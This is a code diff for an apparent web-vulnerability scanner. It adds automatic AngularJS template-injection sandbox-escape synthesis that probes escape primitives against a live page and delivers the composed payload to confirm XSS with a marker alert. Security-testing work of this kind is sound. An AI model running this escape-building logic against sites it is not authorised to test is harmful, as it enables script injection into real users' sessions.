@@ -25,6 +25,7 @@ fires during document commit, before the native listener can attach).
 
 from __future__ import annotations
 
+import json
 import time
 from typing import Any, Dict, List, Optional
 from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse
@@ -32,6 +33,7 @@ from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse
 from dast.payloads.loader import get_value
 from dast.tools.base import Tool, register
 from dast.tools.context import ToolContext
+from dast.triage import xss_synthesis as synth
 from dast.triage.xss_browser import XSS_PROOF_INIT_SCRIPT
 from dast.triage.xss_context import classify_context, detect_angular_version
 from dast.utils.logger import get_logger
@@ -66,9 +68,17 @@ _SCHEMA: Dict[str, Any] = {
         "title": {"type": "string", "description": "Finding title (optional; a sensible default is used)."},
         "severity": {"type": "string", "description": "critical|high|medium|low|info (default high)."},
         "cwe": {"type": "string", "description": "CWE id (default CWE-79)."},
+        "synthesize": {"type": "boolean", "description": "When the curated payloads all MISS on an "
+                       "AngularJS target, attempt deterministic in-tool CSTI sandbox-escape SYNTHESIS "
+                       "— build the escape from primitives, verifying each step against the live "
+                       "target's own $parse/$eval (no LLM). Default true."},
     },
     "required": ["url", "injection_point"],
 }
+
+# Bounds for the deterministic synthesis fallback (no LLM; the live sink is the only oracle).
+_SYNTH_MAX_ORACLE_EVALS = 25
+_SYNTH_MAX_COMPOSE_STEPS = 8
 
 
 def _set_query_param(url: str, param: str, value: str) -> str:
@@ -211,6 +221,51 @@ async def _read_dom(browser: Any) -> str:
         return ""
 
 
+async def _eval_in_page(browser: Any, js: str) -> Any:
+    """Run arbitrary JS on the live page via ``page.evaluate`` and return the value. Reuses the same
+    page path the dialog read JS already uses — the authenticated session is unchanged."""
+    page = await browser._ensure_page()
+    return await page.evaluate(js)
+
+
+def _angular_eval_js(expr: str) -> str:
+    """JS that evaluates an AngularJS expression through the APP's OWN ``$parse``/``$eval`` (the same
+    evaluator the vulnerable sink uses) and returns ``{ok, val}`` or ``{ok:false, err}``. The scope
+    is read from the first ``ng-app``/``ng-controller`` element (falling back to ``$parse`` via the
+    injector), so synthesis probes the REAL sandbox — a sandbox error surfaces as ``err`` (e.g.
+    ``$parse:isecfld``) and a successful evaluation as the stringified ``val``. ``expr`` is embedded
+    as a JSON string literal (synthesis probes never contain a double quote)."""
+    expr_lit = json.dumps(expr)
+    return (
+        "() => {"
+        "  const el = document.querySelector('[ng-app],[ng-controller]') || document.body;"
+        f"  const EXPR = {expr_lit};"
+        "  try {"
+        "    const ng = window.angular;"
+        "    let s = null;"
+        "    if (ng && ng.element) { try { s = ng.element(el).scope(); } catch (e) {} }"
+        "    let r;"
+        "    if (s && s.$eval) { r = s.$eval(EXPR); }"
+        "    else if (ng && ng.element) { r = ng.element(el).injector().get('$parse')(EXPR)(s || {}); }"
+        "    else { return { ok: false, err: 'no-angular' }; }"
+        "    return { ok: true, val: String(r) };"
+        "  } catch (e) { return { ok: false, err: String((e && e.message) || e) }; }"
+        "}"
+    )
+
+
+async def _angular_eval(browser: Any, expr: str) -> Dict[str, Any]:
+    """Evaluate ``expr`` through the app's own Angular evaluator (the per-primitive ORACLE). Returns
+    ``{ok, val, err}``; any transport failure is reported as ``{ok: False, err: ...}``."""
+    try:
+        res = await _eval_in_page(browser, _angular_eval_js(expr))
+    except Exception as exc:
+        return {"ok": False, "err": str(exc)[:160]}
+    if isinstance(res, dict):
+        return {"ok": bool(res.get("ok")), "val": res.get("val"), "err": res.get("err")}
+    return {"ok": False, "err": f"non-dict oracle result: {str(res)[:80]}"}
+
+
 async def _deliver(browser: Any, url: str, point: str, value: str, location: str,
                    key_delivery: bool = False) -> None:
     """Deliver ``value`` at the injection point through the live browser. URL-borne locations
@@ -303,6 +358,119 @@ def _candidate_payloads(context: str, quotes_encoded: bool, version: str, mark: 
     return _context_list() + angular_firsts + _key_candidates()
 
 
+async def _synthesize_angular(browser: Any, url: str, point: str, location: str, version: str,
+                              mark: str, quotes_encoded: bool, key_sink: bool,
+                              steps: List[Dict[str, Any]],
+                              ) -> "tuple[Optional[str], Optional[Dict[str, Any]]]":
+    """Deterministic in-tool AngularJS CSTI sandbox-escape SYNTHESIS (no LLM, no gateway).
+
+    Runs ONLY after every curated candidate has missed. Instead of selecting a canned vector it
+    BUILDS the escape from the ``angular_primitives`` grammar, using the live target's own
+    ``$parse``/``$eval`` as a per-primitive ORACLE: it establishes the sink evaluates expressions
+    (``7*7``→``49``), probes which escape primitive the sandbox permits (picking the
+    ``constructor.constructor`` path or the ``charAt``-override path from the sandbox error codes),
+    composes the escape sub-expression by sub-expression — verifying the no-strings string builder
+    reproduces the exact attack string through the oracle — and finally delivers the composed
+    ``alert(MARK)`` expression through the REAL injection point, confirming on the MARK dialog.
+
+    Bounded: at most ``_SYNTH_MAX_ORACLE_EVALS`` oracle evaluations / ``_SYNTH_MAX_COMPOSE_STEPS``
+    compose steps. Returns ``(payload, dialog)`` on CONFIRM, else ``(None, None)`` so the curated
+    NOT-CONFIRMED verdict stands."""
+    budget = {"evals": 0}
+
+    async def oracle(expr: str) -> Dict[str, Any]:
+        if budget["evals"] >= _SYNTH_MAX_ORACLE_EVALS:
+            return {"ok": False, "err": "oracle budget exhausted"}
+        budget["evals"] += 1
+        return await _angular_eval(browser, expr)
+
+    # (a) ESTABLISH ORACLE — the sink must actually evaluate Angular expressions.
+    o_expr, o_exp = synth.oracle_probe()
+    r = await oracle(o_expr)
+    steps.append({"label": "synth: oracle", "expr": o_expr, "expected": o_exp, "result": r})
+    if not (r.get("ok") and str(r.get("val")) == o_exp):
+        steps.append({"label": "synth: abort — sink does not evaluate expressions"})
+        return None, None
+
+    # (b) PROBE PRIMITIVES — keep the ones that verify; pick the path from what the sandbox permits.
+    verified: List[str] = []
+
+    fc_expr, fc_exp = synth.fromcharcode_probe()
+    r_fc = await oracle(fc_expr)
+    fromcharcode_ok = bool(r_fc.get("ok") and str(r_fc.get("val")) == fc_exp)
+    if fromcharcode_ok:
+        verified.append("string_builder(fromCharCode)")
+    steps.append({"label": "synth: probe fromCharCode", "expr": fc_expr, "expected": fc_exp,
+                  "result": r_fc, "verified": fromcharcode_ok})
+
+    strategy: Optional[str] = None
+    c_expr, c_exp = synth.constructor_probe()
+    r_c = await oracle(c_expr)
+    if r_c.get("ok") and str(r_c.get("val")) == c_exp:
+        verified.append("function_ctor(constructor.constructor)")
+        strategy = "constructor"
+    steps.append({"label": "synth: probe constructor.constructor", "expr": c_expr,
+                  "expected": c_exp, "result": r_c, "verified": strategy == "constructor"})
+
+    if strategy is None:  # sandbox blocked constructor access → try the charAt-override path
+        ch_expr, ch_exp = synth.charat_probe()
+        r_ch = await oracle(ch_expr)
+        charat_ok = bool(r_ch.get("ok") and str(r_ch.get("val")) == ch_exp)
+        if charat_ok:
+            verified.append("charat_override([].join)")
+            strategy = "charat"
+        steps.append({"label": "synth: probe charAt override", "expr": ch_expr, "expected": ch_exp,
+                      "result": r_ch, "verified": charat_ok})
+
+    if strategy is None:
+        steps.append({"label": "synth: abort — no escape primitive verified", "verified": verified})
+        return None, None
+    if strategy == "charat" and not fromcharcode_ok:
+        steps.append({"label": "synth: abort — charAt path needs the fromCharCode builder",
+                      "verified": verified})
+        return None, None
+
+    # (c) COMPOSE — assemble the escape, verifying the no-strings string builder via the oracle.
+    effect = f"alert({mark})"
+    strings_ok = not quotes_encoded
+    if strategy == "charat":
+        code_str = synth.effect_string(effect)            # x=alert(MARK)
+        build_expr = synth.fromcharcode_expr(code_str)
+        r_b = await oracle(build_expr)
+        steps.append({"label": "synth: compose string builder", "expr": build_expr,
+                      "expected": code_str, "result": r_b})
+        if not (r_b.get("ok") and str(r_b.get("val")) == code_str):
+            steps.append({"label": "synth: abort — string builder mismatch"})
+            return None, None
+        final = synth.charat_payload(effect, key_delivery=key_sink)
+        key_delivery = key_sink
+    else:  # constructor path
+        if not strings_ok:  # quotes encoded → the code body must be fromCharCode-built; verify it
+            build_expr = synth.fromcharcode_expr(effect)
+            r_b = await oracle(build_expr)
+            steps.append({"label": "synth: compose string builder", "expr": build_expr,
+                          "expected": effect, "result": r_b})
+            if not (r_b.get("ok") and str(r_b.get("val")) == effect):
+                steps.append({"label": "synth: abort — string builder mismatch"})
+                return None, None
+        final = synth.constructor_payload(effect, strings_ok=strings_ok)
+        key_delivery = False
+
+    steps.append({"label": "synth: composed", "strategy": strategy, "verified": verified,
+                  "payload": final, "key_delivery": key_delivery})
+
+    # (d) CONFIRM — deliver the composed expression through the REAL injection point (the terminal
+    # oracle). The escape runs alert(MARK), so the dialog must echo the unique MARK.
+    await _reset_dialog(browser)
+    await _deliver(browser, url, point, final, location, key_delivery=key_delivery)
+    dialog = await _capture_dialog(browser)
+    if dialog is not None and mark in str(dialog.get("message", "")):
+        steps.append({"label": "synth: CONFIRMED", "payload": final, "dialog": dialog})
+        return final, dialog
+    steps.append({"label": "synth: miss (final delivery)", "payload": final, "dialog": dialog})
+    return None, None
+
+
 async def _xss_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
     url = str(args.get("url", "")).strip()
     point = str(args.get("injection_point", "")).strip()
@@ -377,6 +545,20 @@ async def _xss_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
                                        version, payload, dialog, steps, angular_fixed=angular_fixed)
             steps.append({"label": "miss (dialog without marker)", "payload": payload,
                           "dialog": dialog})
+
+        # 3. All curated candidates missed. On an AngularJS target, try deterministic in-tool CSTI
+        #    synthesis (gateway-free): build the sandbox escape from primitives, using the live sink
+        #    as an oracle. Gated behind ``synthesize`` (default True); additive fallback only.
+        synthesize = bool(args.get("synthesize", True))
+        is_angular = (framework == "angularjs" or angular_parse_sink
+                      or context == "angular_expression")
+        if synthesize and is_angular:
+            syn_payload, syn_dialog = await _synthesize_angular(
+                browser, url, point, location, version, mark,
+                quotes_encoded=quotes_encoded, key_sink=angular_parse_key_sink, steps=steps)
+            if syn_dialog is not None and syn_payload is not None:
+                return _confirm_result(ctx, args, url, method, point, location, context,
+                                       version, syn_payload, syn_dialog, steps, angular_fixed=True)
     except Exception as exc:
         return {"ok": False, "error": f"probe failed: {str(exc)[:200]}", "steps": steps}
 
